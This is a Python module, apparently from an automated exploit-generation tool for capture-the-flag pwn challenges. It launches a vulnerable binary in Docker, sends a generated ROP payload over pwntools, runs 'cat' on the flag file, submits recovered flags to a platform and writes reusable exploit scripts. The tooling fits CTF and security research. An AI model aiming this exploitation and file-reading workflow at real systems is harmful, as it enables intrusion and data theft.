"""
author : 4everdestiny
create_time : 2022.4.7
description : this is the code to check the payload in docker

input : binarypath and payload
output : True when success, False when failed
"""
import copy

from log.log import Log
from exploit_check.ExploitGenerateFile import ExploitGenerateFile
from exploit_generation.ROPGeneration import ROPGeneration
from web_interface.Challenge import Challenge
from web_interface.LongjianBinaryDownload import LongjianBinaryDownload
import pwn
import time
import subprocess
import re

log = Log()


class ExploitCheckRemote:
    def __init__(self, binarypath="", challenge=Challenge()):
        self.binarypath = binarypath
        self.ip = challenge.vm_ip
        self.port = challenge.question_port
        self.haveinitdocker = False
        self.downloadobject = LongjianBinaryDownload()
        self.challenge = challenge

    def CheckPayload(self, payloadlist, write_payload=True,
                     change_file_path=False, index=0, state=None):
        try:
            payload_is_ok = self.CheckPayloadNewProcess(payloadlist=payloadlist)
        except:
            log.Exception("payload error, but we need to write the payload")
            payload_is_ok = False
        if write_payload:
            if not change_file_path:
                egf = ExploitGenerateFile(
                    binarypath=self.binarypath, payloadlist=payloadlist,
                    ip=self.ip, port=self.port, remote=True,
                    filepath="../exploit_check/exploit_generated_temp_remote.py"
                )
            else:
                if payload_is_ok:
                    egf = ExploitGenerateFile(
                        binarypath=self.binarypath, payloadlist=payloadlist,
                        ip=self.ip, port=self.port, remote=True,
                        filepath=self.binarypath + "_remote" + "_success" + str(index) + ".py"
                    )
                else:
                    egf = ExploitGenerateFile(
                        binarypath=self.binarypath, payloadlist=payloadlist,
                        ip=self.ip, port=self.port, remote=True,
                        filepath=self.binarypath + "_remote" + "_fail" + str(index) + ".py"
                    )
            egf.WriteFile()
        return payload_is_ok

    def CheckPayloadNewProcess(self, payloadlist=None):
        """
        check the payload is ok, or not ok by new process
        :return: True when success, False when not
        """
        if not self.haveinitdocker and self.challenge.local_challenge:
            self.InitDocker()

        check_info = "}"
        test_command = "cat {flag_path}".format(flag_path=self.challenge.flag_path)
        pwn.context.log_level = "debug"
        pwn.context.timeout = 3

        try:
            p = pwn.remote(self.ip, self.port)
            payloadlist.CheckPayloadWithProcess(process=p)
            p.sendline(test_command)
            info = p.recvuntil(check_info)
            # print(check_info, info.decode())
            p.close()
            if "flag" in info.decode() or "CTF" in info.decode():
                if "flag" in info.decode():
                    flag = re.findall("flag\{\S+\}", info.decode())[0]
                elif "CTF" in info.decode():
                    flag = re.findall("CTF\{\S+\}", info.decode())[0]
                else:
                    return False
                if not self.challenge.local_challenge:
                    if self.challenge.server_name != "jarvisoj":
                        self.downloadobject.submitflag(flag=flag)
                return True
            else:
                return False
        except:
            p.close()
            log.Exception("payload has some error, please check it")
            return False

    def WritePayloadFile(self, payload):
        final_payload = """
import pwn

pwn.context.timeout = 3
pwn.context.log_level = "debug"
p = pwn.process("{binarypath}")
pwn.gdb.attach(p)
p.send({payload})
p.interactive()
        """.format(binarypath=self.binarypath, payload=str(payload))
        with open("./exploit_generated_temp.py", "w") as f:
            f.write(final_payload)

    def InitDocker(self):
        subprocess.run(["cp", self.binarypath, "../docker/pwn"])
        subprocess.run(["../docker/run.sh", "../docker/pwn", str(self.port)])
        time.sleep(5)
        self.haveinitdocker = True

    def Main(self, payloadlist, write_payload=False):
        self.InitDocker()
        result = self.CheckPayload(
            payloadlist=payloadlist, write_payload=write_payload,
            change_file_path=True
        )
        if result:
            log.success("[Remote]: remote payload check successfully")
        return result

if __name__ == '__main__':
    # have tested:
    # ../binaries/stack_overflow/static/test1/level1_test1
    # ../binaries/stack_overflow/static/test2/level1_test2
    # ../binaries/stack_overflow/static/test3/level1_test3
    # ../binaries/stack_overflow/static/test4/level1_test4
    # ../binaries/stack_overflow/dynamic/test1/dynamic_test1
    # ../binaries/stack_overflow/dynamic/test2/dynamic_test2
    # ../binaries/stack_overflow/dynamic/test2/dynamic_test2
    # ../binaries/stack_overflow/dynamic/test3/dynamic_test3
    # ../binaries/stack_overflow/dynamic/test4/dynamic_test4
    binarypath = "../binaries/stack_overflow/static/test1/static_test1"
    ROPGeneration = ROPGeneration(binarypath, needlength=0x100, prefixlength=0x18)
    ecr = ExploitCheckRemote(binarypath=binarypath)
    # payload = b"a" * 0x18
    # payload += ROPGeneration.GeneratePayload().GetContent()
    payload = ROPGeneration.GeneratePayload()
    result = ecr.Main(payload, write_payload=False)
    print(result)